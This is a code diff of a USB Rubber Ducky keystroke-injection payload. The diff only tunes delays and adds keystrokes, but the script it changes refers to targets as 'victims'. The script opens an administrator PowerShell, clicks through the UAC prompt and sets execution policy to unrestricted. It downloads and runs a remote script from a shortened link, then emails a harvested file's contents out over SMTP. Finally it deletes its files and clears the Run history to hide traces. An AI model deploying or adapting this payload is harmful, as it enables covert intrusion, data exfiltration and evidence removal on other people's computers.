@@ -2,24 +2,24 @@ REM		-- This would be the beginning of the script. 2 second delay to allow USB t
 DELAY 2000
 REM		-- Press Win + R to open 'Run'.
 GUI R
-DELAY 100
+DELAY 200
 REM		-- Start Powershell as administrator (alternatively you can substitute 'CMD' if you prefer).
 STRING powershell Start-Process powershell -Verb runAs
 ENTER
-DELAY 300
+DELAY 600
 REM		-- Press 'ALT + Y' to choose 'Yes' option for UAC dialog box.
 ALT y
-DELAY 300
+DELAY 500
 REM		-- To account for any victim with UAC disabled, cursor will shift left once and press 'DELETE' to remove lowercase 'y' from the shell.
 REM		-- Any victim with UAC enabled, pressing LEFTARROW + DELETE effectively does nothing, which allows us to account for both scenarios.
 LEFTARROW
 DELETE
 STRING Set-ExecutionPolicy unrestricted
 ENTER
-DELAY 300
+DELAY 500
 STRING a
 ENTER
-DELAY 300
+DELAY 500
 REM 		-- The link https://gist.githubusercontent.com/MrSnowMonster/67b473f0395f6c08b7418680de668e1f/raw/8b42c22153056e5c5f0c763b183dcdc88115d010/just%2520for%2520my%2520own%2520testing
 STRING (new-object net.webclient).DownloadFile('https://goo.gl/qdZCGa','in.ps1')
 SHIFT ENTER
@@ -28,7 +28,8 @@ ENTER
 DELAY 2000
 ENTER
 STRING Set-ExecutionPolicy restricted
-DELAY 300
+ENTER
+DELAY 500
 STRING a
 ENTER
 DELAY 300
@@ -55,11 +56,12 @@ STRING $ReportEmail.Body = (Get-Content i.txt | out-string)
 ENTER
 STRING $SMTPInfo.Send($ReportEmail)
 ENTER
-DELAY 2000
+DELAY 500
 STRING del i.txt
 ENTER
 DELAY 500
 STRING del in.ps1
+ENTER
 DELAY 500
 REM Clear the Run history and exit
 STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
